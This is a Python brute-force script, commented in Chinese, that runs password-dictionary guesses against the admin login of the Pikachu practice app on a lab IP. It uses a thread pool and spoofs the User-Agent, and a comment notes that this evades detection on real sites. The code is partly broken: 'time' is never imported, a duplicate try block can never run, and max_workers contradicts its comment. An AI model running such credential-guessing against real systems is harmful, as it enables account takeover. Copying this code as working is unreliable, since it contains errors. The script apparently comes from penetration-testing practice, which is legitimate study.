import random
time.sleep(random.uniform(0.1, 0.5))  # 随机睡 0.1 到 0.5 秒
import requests
import concurrent.futures

# 1. 目标网址 
url = "http://192.168.58.129/pikachu-master/vul/burteforce/bf_form.php"

# 2. 伪装请求头 (真实网站一定会查 User-Agent，不伪装会被当脚本拦截)
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
}

# 3. 定义一个执行爆破的函数
def try_password(pwd):
    pwd = pwd.strip()
    if not pwd: return None
    data = {"username": "admin", "password": pwd, "submit": "Login"}
    try:
        response = requests.post(url, data=data, headers=headers, timeout=3)
        # 加这一行，看看服务器回了什么状态码，以及返回内容的前面一小段
        print(f"尝试: {pwd} | 状态码: {response.status_code} | 返回片段: {response.text[:20]}")
        
        if "password is not exists" not in response.text and "password error" not in response.text:
            return pwd
        return None
    except Exception as e:
        print(f"尝试: {pwd} | 请求报错: {e}")
        return None
    try:
        # 发送请求，带上 headers
        response = requests.post(url, data=data, headers=headers, timeout=3)
        
        # 判断成功条件（这里失败会提示 password is not exists 或 error）
        if "password is not exists" not in response.text and "password error" not in response.text:
            return pwd # 找到了，返回密码
        return None
    except Exception:
        return None

# 4. 主函数
def main():
    print("[*] 开始多线程爆破...")
    
    # 读取字典文件（这里假设文件名为 pass.txt）
    with open("pass.txt", "r", encoding="utf-8", errors="ignore") as f:
        passwords = f.readlines()

    # 开启多线程（max_workers=10 代表同时开10个线程）
    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
        # 将字典里的每一个密码扔给 try_password 函数并发执行
        results = executor.map(try_password, passwords)
        
        # 遍历结果
        for result in results:
            if result:
                print(f"\n[+] 恭喜！成功找到密码: {result}")
                # 找到了就强制退出程序
                exit(0) 
                
    print("\n[-] 字典跑完，未找到正确密码。")

if __name__ == "__main__":
    main()
